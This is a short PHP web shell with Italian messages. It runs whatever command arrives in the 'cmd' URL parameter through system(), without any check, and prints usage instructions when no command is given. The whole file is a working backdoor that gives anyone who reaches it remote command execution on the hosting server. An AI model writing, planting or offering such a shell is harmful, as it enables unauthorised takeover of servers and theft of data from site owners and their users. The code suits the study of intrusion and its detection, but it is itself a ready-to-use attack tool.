<?php
if (isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    echo "***********************\n";
    echo "Esecuzione shell PHP...\n";
    echo "Comando eseguito: ";
    echo $cmd;
    echo "\n***********************\n";
    system($cmd);
    echo "</pre>";
} else {
    echo "<pre>";
    echo "*************************\n";
    echo "Benvenuto nella shell PHP.\n";
    echo "*************************\n";
    echo "Come si usa:\n";
    echo "Inserisci la richiesta nell'url: ?cmd=<command>";
    echo "</pre>";
}
?>
